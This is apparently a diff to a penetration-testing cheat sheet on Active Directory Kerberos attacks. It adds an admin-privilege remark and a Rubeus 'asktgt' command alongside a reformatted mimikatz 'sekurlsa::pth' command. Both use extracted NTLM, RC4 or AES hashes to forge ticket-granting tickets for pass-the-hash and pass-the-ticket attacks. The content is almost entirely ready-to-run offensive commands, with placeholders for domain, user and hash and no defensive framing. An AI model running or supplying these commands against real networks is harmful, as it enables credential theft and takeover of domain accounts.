@@ -24,10 +24,14 @@ sekurlsa::ekeys
 ```
 We must pay attention to AES256_HMAC and RC4_HMAC keys, as we can use them to forge TGT and perfrom PTT attacks with either mimikatz or Rubeus
 
--Using mimikatz:
+-Using mimikatz (Require Admin Privilege):
 ```
 mimikatz.exe
 privilege::debug
-sekurlsa::pth /domain:<domain> /user:<username> /<ntlm/rc4>: <hash>
+sekurlsa::pth /domain: <domain> /user: <username> /<ntlm/rc4>: <hash>
 #As result, a new cmd window will be opened with specific user's TGT
+```
+-Using Rubeus:
+```
+Rubeus.exe asktgt /domain: <domain> /user: <username> /<rc4/aes128/aes256>: <hash> /nowrap
 ```
